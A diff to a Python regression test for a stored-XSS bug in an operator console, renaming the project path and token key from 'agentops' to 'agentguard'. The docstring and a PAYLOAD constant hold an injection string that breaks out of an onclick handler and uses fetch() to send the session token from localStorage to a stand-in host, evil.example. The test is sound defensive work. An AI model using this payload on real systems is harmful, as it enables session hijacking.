@@ -1,7 +1,7 @@
 """Regression for a confirmed stored-XSS in the operator console.
 
 Reproduced live in a browser before this fix: creating an agent named
-    x'); fetch('https://evil/steal?c='+localStorage.getItem('agentops_token')); //
+    x'); fetch('https://evil/steal?c='+localStorage.getItem('agentguard_token')); //
 (accepted server-side — AgentIn.name has no pattern restriction) and clicking
 "Reputation" on that agent's row ran the injected JS and could exfiltrate the
 console's session token, which is stored in localStorage.
@@ -27,7 +27,7 @@ from pathlib import Path
 
 import pytest
 
-_HTML = Path(__file__).parent.parent / "agentops" / "static" / "index.html"
+_HTML = Path(__file__).parent.parent / "agentguard" / "static" / "index.html"
 
 pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not available")
 
@@ -51,7 +51,7 @@ def _run_node(js_snippet: str) -> str:
 
 # The exact payload reproduced live: breaks out of the onclick JS string and
 # exfiltrates the session token the moment the button is clicked.
-PAYLOAD = "x'); fetch('https://evil.example/steal?c='+localStorage.getItem('agentops_token')); //"
+PAYLOAD = "x'); fetch('https://evil.example/steal?c='+localStorage.getItem('agentguard_token')); //"
 
 
 def _simulate_click(name: str) -> dict:
